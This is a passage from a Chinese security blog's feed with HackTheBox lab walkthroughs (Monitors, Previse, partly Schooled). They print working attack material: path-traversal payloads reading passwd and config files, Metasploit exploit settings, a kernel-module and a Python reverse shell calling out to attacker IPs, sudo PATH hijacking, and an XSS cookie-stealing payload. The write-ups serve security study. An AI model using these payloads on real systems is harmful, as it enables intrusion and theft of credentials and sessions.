class="hljs-symbol">d:</span><span class="hljs-number">76</span><span class="hljs-symbol">:</span><span class="hljs-number">23</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">b:</span><span class="hljs-number">53</span><span class="hljs-symbol">:f8</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">a:</span><span class="hljs-number">94</span> (<span class="hljs-title class_">ED25519</span>)<br><span class="hljs-number">80</span>/tcp open  http    <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((<span class="hljs-title class_">Ubuntu</span>))<br>|_http-server-<span class="hljs-symbol">header:</span> <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (<span class="hljs-title class_">Ubuntu</span>)<br>|_http-<span class="hljs-symbol">title:</span> <span class="hljs-title class_">Site</span> doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=iso-8859-1).</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure><h1 id="0x02-Webshell"><a href="#0x02-Webshell" class="headerlink" title="0x02 Webshell"></a>0x02 Webshell</h1><p>首先访问IP，发现不允许连接。并发现域名<code>monitors.htb</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021152549320.png" alt="image-20211021152549320"></p><p>将域名插入<code>/etc/hosts</code>中</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021152826764.png" alt="image-20211021152826764"></p><p>再次访问，得到如下界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021152932948.png" alt="image-20211021152932948"></p><p>发现是wordpress，使用<code>wpscan</code>对该站点进行扫描，发现其安装了一带漏洞的插件，可以进行文件包含。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021153658421.png" alt="image-20211021153658421"></p><p>payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021153800984.png" alt="image-20211021153800984"></p><p>首先可以读一下数据库配置文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=..<span class="hljs-regexp">/../</span>../wp-config.php<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211021154115673.png" alt="image-20211021154115673"></p><p>拿到数据库凭据信息：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">/** MySQL database username */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;wpadmin&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL database password */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;BestAdministrator@2020!&#x27;</span> );<br></code></pre></td></tr></table></figure><p>尝试使用该用户名密码登录WordPress后台，未果。</p><p>遂尝试从文件包含收集信息，最终发现在apache的默认站点配置文件下发现一个域名：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022164711627.png" alt="image-20211022164711627"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">cacti-<span class="hljs-literal">admin</span>.monitors.htb<br></code></pre></td></tr></table></figure><p>同样将该站点插入<code>/etc/hosts</code>中，访问该站点：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022165026897.png" alt="image-20211022165026897"></p><p>查一下历史漏洞，发现cacti存在SQL注入漏洞：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022165239967.png" alt="image-20211022165239967"></p><p>尝试利用的时候发现上面通过文件包含拿到的密码可以成功登录，于是直接以<code>admin:BestAdministrator@2020!</code>成功登录</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022170316583.png" alt="image-20211022170316583"></p><p>尝试寻找上传点，未果。再次尝试寻找RCE，发现<code>Metasploit</code>已经提供了成熟的利用模块：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022193417078.png" alt="image-20211022193417078"></p><p>配置好参数，一发入魂：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gradle">msf6 exploit(unix<span class="hljs-regexp">/http/</span>cacti_filter_sqli_rce) &gt; show <span class="hljs-keyword">options</span> <br><br>Module <span class="hljs-keyword">options</span> (exploit<span class="hljs-regexp">/unix/</span>http/cacti_filter_sqli_rce):<br><br>   Name       Current Setting           Required  <span class="hljs-keyword">Description</span><br>   ----       ---------------           --------  -----------<br>   CREDS      <span class="hljs-keyword">true</span>                      no        <span class="hljs-keyword">Dump</span> cacti creds<br>   PASSWORD   admin                     no        Password to login with<br>   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS     cacti-admin.monitors.htb  yes       The target host(s), see https:<span class="hljs-comment">//github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br>   RPORT      <span class="hljs-number">80</span>                        yes       The target port (TCP)<br>   SSL        <span class="hljs-keyword">false</span>                     no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   TARGETURI  <span class="hljs-regexp">/cacti/</span>                   yes       The URI of Cacti<br>   USERNAME   admin                     yes       User to login with<br>   VHOST                                no        HTTP server virtual host<br><br><br>Payload <span class="hljs-keyword">options</span> (php<span class="hljs-regexp">/meterpreter/</span>reverse_tcp):<br><br>   Name   Current Setting  Required  <span class="hljs-keyword">Description</span><br>   ----   ---------------  --------  -----------<br>   LHOST  <span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span>       yes       The listen address (an <span class="hljs-keyword">interface</span> may be specified)<br>   LPORT  <span class="hljs-number">4444</span>             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   <span class="hljs-number">0</span>   Automatic Target<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022193752191.png" alt="image-20211022193752191"></p><h1 id="0x03-User-Shell"><a href="#0x03-User-Shell" class="headerlink" title="0x03 User Shell"></a>0x03 User Shell</h1><p><code>home</code>目录下只有<code>marcus</code>一个用户，查看目录可以发现有个<code>.backup</code>文件夹</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022212055574.png" alt="image-20211022212055574"></p><p>但是这个权限设置的比较有意思，我们无法查看文件夹里面的文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022212406247.png" alt="image-20211022212406247"></p><p>无奈之下尝试在其他目录找找线索。一番搜索后发现<code>etc</code>目录下有关键的信息：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -R marcus <span class="hljs-regexp">/etc 2&gt;/</span>dev/<span class="hljs-keyword">null</span> #这里注意是-R不是-r，-r搜不到<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022213930674.png" alt="image-20211022213930674"></p><p>查看该文件能够找到一个密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022214302879.png" alt="image-20211022214302879"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">VerticalEdge2020<br></code></pre></td></tr></table></figure><p>尝试使用该密码连接ssh，成功拿到用户<code>marcus</code>的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022214559726.png" alt="image-20211022214559726"></p><h1 id="0x04-Root-Shell"><a href="#0x04-Root-Shell" class="headerlink" title="0x04 Root Shell"></a>0x04 Root Shell</h1><p>marcus的home目录下有一个<code>note.txt</code>。查看发现是与docker相关的信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022214643649.png" alt="image-20211022214643649"></p><p>使用ps命令查找相关进程，发现8443端口起了另一个服务，且只允许本地连接：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> docker<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022214819735.png" alt="image-20211022214819735"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022215459777.png" alt="image-20211022215459777"></p><p>使用SSH作端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 8443:localhost:8443 marcus@10.10.10.238<br></code></pre></td></tr></table></figure><p>访问本地8443端口，发现是个tomcat：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022215013266.png" alt="image-20211022215013266"></p><p>扫目录发现<code>apache ofbiz</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211022222043515.png" alt="image-20211022222043515"></p><p>上网找CVE，搜索发现msf直接集成了exp，遂直接使用：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">use exploit/linux/http/apache_ofbiz_deserialization<br>set payload linux/x64/meterpreter/reverse_tcp<br>set rhosts localhost<br>set lhost 10.10.14.8<br>set lport 4567<br>set ForceExploit true<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211023100322197.png" alt="image-20211023100322197"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211023100351733.png" alt="image-20211023100351733"></p><p>接下来是docker容器逃逸，关于这方面的知识可以看看90sec Team写的一篇<a href="https://mp.weixin.qq.com/s/uvJ1y65IZQpmA5dAVb2xEA">文章</a>。</p><p>在这个环境中，是利用了<code>CAP_SYS_MODULE</code>的错误配置完成逃逸，首先使用capsh命令查看capabilities：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">capsh <span class="hljs-comment">--print</span><br></code></pre></td></tr></table></figure><p>发现具有CAP_SYS_MODULE权限：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211023102029601.png" alt="image-20211023102029601"></p><p>利用过程如下，首先创建两个文件：</p><p>reverse-shell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kmod.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-type">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;; <span class="hljs-comment">//这里填宿主机IP</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* envp[] = &#123;<span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">reverse_shell_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> call_usermodehelper(argv[<span class="hljs-number">0</span>], argv, envp, UMH_WAIT_EXEC);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">reverse_shell_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Exiting\n&quot;</span>);<br>&#125;<br>module_init(reverse_shell_init);<br>module_exit(reverse_shell_exit);<br></code></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">obj-m +=reverse-shell.o<br>all:<br>make -C /lib/modules/$(shell <span class="hljs-built_in">uname</span> -r)/build M=$(PWD) modules<br>clean:<br>make -C /lib/modules/$(shell <span class="hljs-built_in">uname</span> -r)/build M=$(PWD) clean<br></code></pre></td></tr></table></figure><p>将上述文件下载到docker容器中，之后在宿主机启动nc进行监听：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211023111315801.png" alt="image-20211023111315801"></p><p>在容器中编译并插入恶意模块：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">make</span><br>insmod <span class="hljs-built_in">reverse</span>-<span class="hljs-keyword">shell</span>.ko<br></code></pre></td></tr></table></figure><p>即可成功逃逸，拿到root的宿主机shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Monitors.assets/image-20211023122128078.png" alt="image-20211023122128078"></p><h1 id="0x05-Summary"><a href="#0x05-Summary" class="headerlink" title="0x05 Summary"></a>0x05 Summary</h1><p>这是一个Hard难度的Linux靶机，主要考察内容如下：</p><ul><li>wpscan</li><li>文件包含</li><li>站点发现</li><li>历史CVE利用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Previse</title>
    <link href="/2021/12/07/HTB/Previse/"/>
    <url>/2021/12/07/HTB/Previse/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>端口信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164457889.png" alt="image-20210905164457889"></p><p>目录扫描：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905165344774.png" alt="image-20210905165344774"></p><h1 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h1><p>在之前的收集信息中，可以发现有很多存在的页面，但是由于重定向跳回了login.php进行登录验证。</p><p>我们使用burp可以渲染页面，可以看到很多页面是有有用的信息的。</p><p>账户注册界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164807598.png" alt="image-20210905164807598"></p><p>服务器状态浏览界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164838718.png" alt="image-20210905164838718"></p><p>在文件浏览界面可以发现网站的源码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905164949228.png" alt="image-20210905164949228"></p><p>也可以发现下载的链接，但是访问会跳回<code>login.php</code>进行登录验证，无奈只能先注册账户。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905165643447.png" alt="image-20210905165643447"></p><p>访问一开始的<code>accounts.php</code>，同时让burp拦截响应，将响应包状态码修改成<code>200 OK</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905170023220.png" alt="image-20210905170023220"></p><p>之后便可以添加账号：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905170035868.png" alt="image-20210905170035868"></p><p>之后以该账号登录，访问<code>files.php</code>，就可以将源码下下来了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905211300285.png" alt="image-20210905211300285"></p><h1 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h1><p>在<code>config.php</code>中可以看到数据库连接的凭据：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905170618570.png" alt="image-20210905170618570"></p><p>在<code>conifg.php</code>中可以发现<code>exec</code>函数直接拼接了参数，可以造成命令执行：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905172453295.png" alt="image-20210905172453295"></p><h1 id="0x04-继续打靶"><a href="#0x04-继续打靶" class="headerlink" title="0x04 继续打靶"></a>0x04 继续打靶</h1><p>使用简单的命令拼接即可，这里弹个shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.86.131&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905180543533.png" alt="image-20210905180543533"></p><p>这里有个坑点，hash中有特殊字符，必须使用在linux环境下才能正确拿到。windows下拿到的是不完整的，拿去解hash会报错</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905212541788.png" alt="image-20210905212541788"></p><p>在linux环境下能够正常显示(为Emoji</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905194148408.png" alt="image-20210905194148408"></p><p>拿去给hashcat爆破，爆破出密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905193619471.png" alt="image-20210905193619471"></p><p>登录成功：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905194408362.png" alt="image-20210905194408362"></p><h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p>可以看到有备份脚本：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905213714674.png" alt="image-20210905213714674"></p><p>查看该脚本，可以使用了gzip命令，我们可以使用自己的gzip命令来替换，从而达到提权的效果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905213830572.png" alt="image-20210905213830572"></p><p>于是新建文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim gzip<br></code></pre></td></tr></table></figure><p>这里有位老哥和我一样的想法2333，于是借用了一下他的代码，我的是下面那一行：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905200530507.png" alt="image-20210905200530507"></p><p>之后添加环境变量，使得执行脚本时会先找到我们的<code>gzip</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=$( <span class="hljs-built_in">pwd</span> ):<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>之后执行命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /opt/scripts/access_backup.sh<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Previse.assets/image-20210905195611062.png" alt="image-20210905195611062"></p><h1 id="0x06-Summary"><a href="#0x06-Summary" class="headerlink" title="0x06 Summary"></a>0x06 Summary</h1><p>这是一个Easy难度的Linux靶机，主要考察内容如下：</p><ul><li>不合理的302跳转利用</li><li>代码审计</li><li>hashcat爆破密码</li><li>PATH变量劫持</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Schooled</title>
    <link href="/2021/12/07/HTB/Schooled/"/>
    <url>/2021/12/07/HTB/Schooled/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>使用nmap进行扫描，老样子还是只开了ssh和http的端口：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910161649184.png" alt="image-20210910161649184"></p><p>访问IP地址，将得到的域名添加进Host，扫了扫目录，依旧没有什么发现：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911163522674.png" alt="image-20210911163522674"></p><p>然后从子域名入手，使用<code>ffuf</code>FUZZ了一下，能够找到两个子域名，将其丢进host文件里绑定IP。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911163405210.png" alt="image-20210911163405210"></p><p>题外话：用BURP试了一下测不出来，不知道为什么burp会受host文件的影响，看来Repeater不能用来做这种测试。</p><h1 id="0x02-Webshell"><a href="#0x02-Webshell" class="headerlink" title="0x02 Webshell"></a>0x02 Webshell</h1><p>登录<code>moodle.schooled.htb</code>的站点，注册用户能够看到上传文件的点，试了下，Getshell未果。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910201637418.png" alt="image-20210910201637418"></p><p>然后翻了翻课程，发现一些有意思的东西。全部就只有这个Math课程可以点进去，然后有个老师说会查看各个学生的Profile：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910203029794.png" alt="image-20210910203029794"></p><p>谷歌刚好能够搜到一个CVE-2020-25627，这是一个XSS的CVE。照着Poc插打Cookie的Payload，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-keyword">var</span> i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>;i.<span class="hljs-property">src</span>=<span class="hljs-string">&quot;http://10.10.14.10:8000/xss.php?&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910203804235.png" alt="image-20210910203804235"></p><p>等待三五分钟后能够拿到老师的Cookie：</p><p>HTB所有涉及靶机连接攻击机的行为都应该在Kali上进行，Windows容易出Bug….</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910212907038.png" alt="image-20210910212907038"></p><p>拿到Cookie后替换即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210910213017790.png" alt="image-20210910213017790"></p><p>谷歌上还有moodle的CVE-2020-14321漏洞，可以用于提权，原理是老师enroll时没有作权限校验导致垂直越权，可以直接提权到manager。</p><p>使用了现成的exp脚本 <a href="https://github.com/lanzt/CVE-2020-14321">https://github.com/lanzt/CVE-2020-14321</a> </p><p>如果想手工的话，参考 <a href="https://www.youtube.com/watch?v=BkEInFI4oIU">https://www.youtube.com/watch?v=BkEInFI4oIU</a></p><p>exp只是跑了个<code>whoami</code>命令，我们需要一个反弹的shell。于是乎从exp中提取出恶意的plugin，加入反弹shell的php代码，然后重新打包，上传到网站上安装。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911123919470.png" alt="image-20210911123919470"></p><p>之后访问 <a href="http://moodle.schooled.htb/moodle/blocks/rce/lang/en/revserse_shell.php">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/revserse_shell.php</a> 即可拿到shell。</p><h1 id="0x03-UserShell"><a href="#0x03-UserShell" class="headerlink" title="0x03 UserShell"></a>0x03 UserShell</h1><p>然而这只是一个普通的www权限的shell，我们需要提权才能做更多的事。</p><p>查找后发现网站放在<code>/usr/local/www</code>目录下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911151956967.png" alt="image-20210911151956967"></p><p>继续翻，能够看到<code> /usr/local/www/apache24/data/moodle</code> 下有个<code>config.php</code> ，能够拿到数据库配置。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911152234879.png" alt="image-20210911152234879"></p><p>有个admin账号，破一下哈希能够拿到密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911153110405.png" alt="image-20210911153110405"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911155712454.png" alt="image-20210911155712454"></p><p>登录之，拿到一个普通账户的ssh：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/Schooled.assets/image-20210911155812960.png" alt="image-20210911155812960"></p><h1 id="0x04-RootShell"><a href="#0x04-RootShell" class="headerlink" title="0x04 RootShell"></a>0x04 RootShell</h1><p>看看sudo能够发现<code>pkg</code>命令被设置了suid位</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span 